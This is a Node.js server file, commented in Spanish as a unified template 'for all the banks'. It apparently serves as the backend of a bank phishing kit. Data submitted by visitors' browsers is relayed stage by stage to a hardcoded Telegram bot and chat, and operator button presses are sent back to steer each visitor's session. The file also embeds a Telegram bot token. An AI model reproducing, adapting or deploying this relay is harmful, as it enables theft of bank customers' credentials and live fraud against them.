/**
 * SERVIDOR BASE UNIFICADO PARA TODAS LAS BANCAS
 * Plantilla optimizada y centralizada
 */

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

// Configuración
const CONFIG = {
    TELEGRAM_TOKEN: '8518189691:AAEoMP1--3TW_JLSZvpNUHdMejthUIVxeW8',
    CHAT_ID: '-5171537243',
    PORT: process.env.PORT || 3000
};

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

const bot = new TelegramBot(CONFIG.TELEGRAM_TOKEN, { polling: true });

// Almacenamiento de sesiones
const sessions = new Map();
const socketToSession = new Map();

// Middleware
app.use(express.json());
app.use(express.static(__dirname));
app.use('/js', express.static(path.join(__dirname, '../../js')));

// Socket.IO Connection
io.on('connection', (socket) => {
    const sessionId = uuidv4();
    sessions.set(sessionId, { socketId: socket.id, data: {} });
    socketToSession.set(socket.id, sessionId);
    
    socket.emit('session-created', { sessionId });
    console.log(`✅ Cliente conectado: ${socket.id} | Sesión: ${sessionId}`);

    // Enviar mensaje a Telegram
    socket.on('send-to-telegram', async (payload) => {
        try {
            const { stage, data } = payload;
            const session = sessions.get(sessionId);
            
            if (session) {
                session.data = { ...session.data, ...data };
            }

            await bot.sendMessage(CONFIG.CHAT_ID, data.text, {
                parse_mode: 'HTML',
                reply_markup: data.keyboard
            });

            console.log(`📤 Mensaje enviado | Stage: ${stage}`);
        } catch (error) {
            console.error('❌ Error enviando a Telegram:', error);
            socket.emit('telegram-error', { error: error.message });
        }
    });

    socket.on('disconnect', () => {
        socketToSession.delete(socket.id);
        console.log(`🔌 Cliente desconectado: ${socket.id}`);
    });
});

// Telegram Callback Handler
bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    const [action, sessionId] = data.split(':');
    
    const session = sessions.get(sessionId);
    if (session) {
        const targetSocket = io.sockets.sockets.get(session.socketId);
        if (targetSocket) {
            targetSocket.emit('telegram-action', { action, sessionId });
            await bot.answerCallbackQuery(callbackQuery.id, { text: `Acción: ${action}` });
        }
    }
});

// Iniciar servidor
server.listen(CONFIG.PORT, () => {
    console.log(`🚀 Servidor ejecutándose en http://localhost:${CONFIG.PORT}`);
});
